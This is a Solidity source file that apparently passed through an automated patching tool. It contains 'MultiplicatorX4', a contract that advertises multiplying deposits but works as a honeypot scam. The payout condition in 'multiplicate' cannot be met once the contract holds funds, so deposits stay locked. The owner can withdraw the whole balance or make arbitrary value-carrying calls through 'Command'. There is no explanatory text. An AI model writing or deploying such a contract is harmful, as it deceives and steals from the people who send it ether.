pragma solidity ^0.4.18;

                        contract sGuardPlus {
                                constructor() internal {
                                        
                                        
                                }
                                
                                
                                
                                
                        }
                contract MultiplicatorX4  {
address  public   Owner = msg.sender;
function () public payable {
}

function withdraw () public payable {
require(msg.sender==Owner);
Owner.transfer(this.balance);
}

function Command (address    adr,bytes    data) public payable {
require(msg.sender==Owner);
bool     __sent_result100 = adr.call.value(msg.value)(data);
require(__sent_result100);
}

function multiplicate (address    adr) public payable {
if (msg.value>=this.balance)
{
adr.transfer(this.balance+msg.value);
}

}

}
